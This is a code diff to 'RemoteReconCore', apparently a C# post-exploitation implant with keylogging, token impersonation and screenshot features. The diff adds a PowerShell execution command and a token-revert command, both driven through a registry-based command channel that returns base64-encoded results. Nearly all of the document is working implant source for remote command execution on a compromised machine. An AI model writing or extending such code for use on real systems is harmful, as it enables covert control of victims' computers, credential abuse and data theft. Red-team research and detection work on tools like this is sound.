@@ -9,6 +9,9 @@ using System.Threading;
 using ReflectiveInjector;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Collections.ObjectModel;
 
 namespace RemoteReconCore
 {
@@ -58,6 +61,7 @@ namespace RemoteReconCore
                         rrbase.SetValue(argumentkey, "");
                         //rrbase.SetValue(runkey, "");
                         command = new KeyValuePair<int, object>(0, "");
+                        result = new KeyValuePair<int, object>(0, "");
                         break;
                     case (int)Cmd.Screenshot:
 #if DEBUG
@@ -70,6 +74,30 @@ namespace RemoteReconCore
                         rrbase.SetValue(argumentkey, "");
                         rrbase.SetValue(runkey, "");
                         command = new KeyValuePair<int, object>(0, "");
+                        result = new KeyValuePair<int, object>(0, "");
+                        break;
+
+                    case (int)Cmd.PowerShell:
+#if DEBUG
+                        Console.WriteLine("Writing Powershell command result");
+#endif
+                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
+                        rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
+                        rrbase.SetValue(commandkey, 0);
+                        rrbase.SetValue(argumentkey, "");
+                        command = new KeyValuePair<int, object>(0, "");
+                        result = new KeyValuePair<int, object>(0, "");
+                        break;
+                    case (int)Cmd.Revert:
+#if DEBUG
+                        Console.WriteLine("Writing Revert command result");
+#endif
+                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
+                        rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
+                        rrbase.SetValue(commandkey, 0);
+                        rrbase.SetValue(argumentkey, "");
+                        command = new KeyValuePair<int, object>(0, "");
+                        result = new KeyValuePair<int, object>(0, "");
                         break;
                     default:
                         break;
@@ -89,11 +117,36 @@ namespace RemoteReconCore
             }
             else if ((int)Cmd.Screenshot == command.Key)
             {
-#if DEBUG 
+#if DEBUG
                 Console.WriteLine("Received Screenshot command");
 #endif
                 mod = Convert.FromBase64String((string)rrbase.GetValue(modkey));
                 GetScreenShot(Convert.ToInt32(command.Value));
+            }
+            else if ((int)Cmd.PowerShell == command.Key)
+            {
+#if DEBUG
+                Console.WriteLine("Received PowerShell command");
+#endif
+                string decoded = Encoding.ASCII.GetString(Convert.FromBase64String((string)command.Value));
+                RunPowershell(decoded);
+            }
+            else if ((int)Cmd.Revert == command.Key)
+            {
+#if DEBUG
+                Console.WriteLine("Received Revert command");
+#endif
+                try
+                {
+                    context.Undo();
+                    string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Successfully reverted token."));
+                    result = new KeyValuePair<int, object>(0, msg);
+                }
+                catch (Exception e)
+                {
+                    string err = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
+                    result = new KeyValuePair<int, object>(4, err);
+                }
             }
         }
 
@@ -114,7 +167,8 @@ namespace RemoteReconCore
             KeylogFailed = 3,
             ImpersonateFailed = 4,
             PSFailed = 5,
-            AssemblyFailed = 6
+            AssemblyFailed = 6,
+            RevertFailed = 7
         }
 
         public enum Cmd : int
@@ -149,6 +203,39 @@ namespace RemoteReconCore
             catch (Exception e)
             {
                 result = new KeyValuePair<int, object>(4, e.ToString());
+            }
+        }
+
+        private void RunPowershell(string cmd)
+        {
+            try
+            {
+                Runspace runspace = RunspaceFactory.CreateRunspace();
+                runspace.Open();
+                RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
+                Pipeline pipeline = runspace.CreatePipeline();
+
+                //Adding command
+                pipeline.Commands.AddScript(cmd);
+
+                //Get output 
+                pipeline.Commands.Add("Out-String");
+                Collection<PSObject> results = pipeline.Invoke();
+                runspace.Close();
+
+                //Convert to string
+                StringBuilder resultString = new StringBuilder();
+                foreach (PSObject obj in results)
+                {
+                    resultString.Append(obj);
+                }
+
+                string enc = Convert.ToBase64String(Encoding.ASCII.GetBytes(resultString.ToString().Trim()));
+                result = new KeyValuePair<int, object>(0, enc);
+            }
+            catch (Exception e)
+            {
+                result = new KeyValuePair<int, object>(5, e.ToString());
             }
         }
 
@@ -198,7 +285,7 @@ namespace RemoteReconCore
             }
         }
         
-        private byte[] GetReconModule()
+        /*private byte[] GetReconModule()
         {
             string resourceName = "";
             string bytestring = "";
@@ -215,7 +302,7 @@ namespace RemoteReconCore
             }
 
             return Convert.FromBase64String(bytestring);
-        }
+        }*/
 
         private byte[] PatchRemoteReconNative(string cmd)
         {
